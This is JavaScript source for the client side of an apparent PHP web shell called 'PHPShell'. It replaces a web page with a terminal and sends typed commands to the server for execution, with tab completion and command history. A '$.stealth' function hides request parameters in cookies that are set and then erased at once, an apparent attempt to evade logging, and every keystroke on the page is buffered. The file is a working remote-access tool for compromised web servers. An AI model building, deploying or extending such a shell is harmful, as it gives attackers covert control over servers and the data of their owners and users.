var PHPShell = {};

(function(phpshell){
  var input = '';
  var history = [];
  var inputBuffer = [];

  try {
    history = JSON.parse(localStorage.getItem('hist')) || [];
  } catch(e){}

  $.stealth = function(url, data, callback, type){
    for(var k in data){
      if(data[k] instanceof Array){
        data[k].forEach(function(v,i){
          document.cookie = k + '['+ i +']=' + encodeURIComponent(v) + ";";
        });
      } else {
        document.cookie = k + '=' + encodeURIComponent(data[k]) + ";";
      }

    }
    setTimeout(function(){
      for(var k in data){
        if(data[k] instanceof Array){
          data[k].forEach(function(v,i){
            document.cookie = k + '['+ i +']=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
          });
        } else {
          console.log(k);
          document.cookie = k + '=;expires=Thu, 01 Jan 1970 00:00:00 UTC;';
        }
      }
    },0);
    return $.get(url, callback, type);

  };

  function request(data, callback, type){
    return $[SHELL_INFO.requestMode || 'post'](window.location.href + "?" + (new Date).getTime(),data,callback,type);
  }

  var currentHistory = 0;
  var $pre = $('<pre>');
  $('body > *').each(function(){
    $(this).remove();
  });
  var mode = localStorage.getItem('ps_xmode') || SHELL_INFO.mode || 'exec';

  var onCommandListeners = [];

  $('body').append($pre);
  var $output = $('<span class="output"></span>');
  $pre.append($output);
  var $input = $('<input class="input">');
  $pre.append($input);

  $('body').append($('<div class="bg"></div>'));

  $input.focus();
  $input.css('min-width','100px');
  /**
   * Current suggestions
   * @type Array|Array|@exp;data@pro;suggestions
   */
  var suggestions = [];

  /**
   * Current suggestion index
   * @type Number|Number|Number
   */
  var currentSuggestion = 0;

  /**
   * Previous keystroke
   * @type Number|Number|@exp;e@pro;which
   */
  var lastKey = 0;

  $('body').keydown(function(e){
    inputBuffer.push(e.which);
  });

  $input.keydown(function(e){
     switch(e.which){
         case 9:
             if(lastKey != 9){
                 suggestions = [];
                 request({
                   action:'suggest',
                   cwd:SHELL_INFO.cwd,
                   input:$input.val()
                 }, function(data){
                   suggestions = data.suggestions;
                   $input.val(suggestions[currentSuggestion]);
                   $input.css('width',12+($input.val().length*12));
                 },"JSON");

                 currentSuggestion = 0;
             } else if(suggestions.length > 0) {
                 currentSuggestion++;
                 if(currentSuggestion >= suggestions.length) currentSuggestion = 0;
                 else $input.val(suggestions[currentSuggestion]);

                 $input.val(suggestions[currentSuggestion]);
                 $input.css('width',12+($input.val().length*12));
             }


             lastKey = 9;

             e.preventDefault();
             return false;
         break;
         case 38:
             currentHistory++;
             if(currentHistory > history.length){
                 currentHistory = 0;
                 $input.val('');
             } else {
                 $input.val('');
                 setTimeout(function(){
                     $input.val(history[history.length-currentHistory]);
                     $input.css('width',12+($input.val().length*12));
                 },50);
             }



         break;
         case 40:
             currentHistory--;
             if(history < 0){
                 history = 0;
                 $input.val('');
             } else
             $input.val(history[history.length-currentHistory]);
         break;
         case 13:
             runStatement();
         break;
         default: console.log(e.which);
         break;
     }
     lastKey = e.which;
     $input.css('width',12+($input.val().length*12));
  });

  function animateCursor(){
      $("html, body").stop();
      $("html, body").animate({ scrollTop: $(document).height() }, 200);
  }


  function write(s){
      $output.append(s);
  }

  function writeln(s){
      $output.append(s+'\n');
  }
  function writeCmdLine(){
      var cwdStr = SHELL_INFO.prompt_style;
      var cwdVars = {
          cwd      : SHELL_INFO.cwd,
          hostname : SHELL_INFO.hostname,
          user     : SHELL_INFO.user
      };

      $.each(cwdVars,function(i){
          cwdStr = cwdStr.replace('%'+i+'%',this);
      });

      write('\n<span class="cwd">'+cwdStr+'</span>');
  }

  function runStatement(){
      var statement = $input.val();
      if(history[history.length-1] !== statement){
        history.push(statement);
        localStorage.setItem('hist', JSON.stringify(history));
      }
      currentHistory = 0;
      $input.val('');
      writeln(statement);

      /*
       * Client side commands
       */

      /* Clear terminal */
      if(statement == "clear" || statement == "cls"){
          $output.html('');
          writeCmdLine();
          return;
      }

      var stopPropagation = false;

      $(onCommandListeners).each(function(){
         if(this.call(phpshell,statement) === false){
             stopPropagation = true;
             return false;
         }
      });

      if(stopPropagation){
          return false;
      }

      /* setmode ... */
      var setMode = statement.match(/^xsetmode *([a-z-_]*)/);

      if(setMode && setMode.length == 2){
          if($.inArray(setMode[1],supportedModes) > -1){
              mode = setMode[1];
              writeln('PHPShell mode set to '+mode);
              localStorage.setItem('ps_xmode', mode);
          } else {
              writeln('"'+setMode[1]+'" is not a valid option.\nSupported modes: '+supportedModes.join(', ')
              + "\nCurrent mode: "+mode);
          }
          writeCmdLine();
          return;
      }

      /* ... If command is not recognized as client side, then send to server */
      request({action:'exec',cwd:SHELL_INFO.cwd,cmd:statement,mode:mode},function(response){
        write(response.html ? response.output : document.createTextNode(response.output));
        SHELL_INFO.cwd = response.cwd;
        writeCmdLine();
        animateCursor();
      },"JSON").error(function(r){
        write(r.responseText); writeCmdLine();
      });
  }
  phpshell.onCommand = function(callback){
      onCommandListeners.push(callback);
  };

  phpshell.getInputBuffer = function(){
    var buf = inputBuffer;
    inputBuffer = [];
    return buf;
  }

  phpshell.writeln = writeln;
  phpshell.write = write;
  phpshell.writeCmdLine = writeCmdLine;

  phpshell.request = request;


  writeln(SHELL_INFO.motd);
  writeCmdLine();

})(PHPShell);
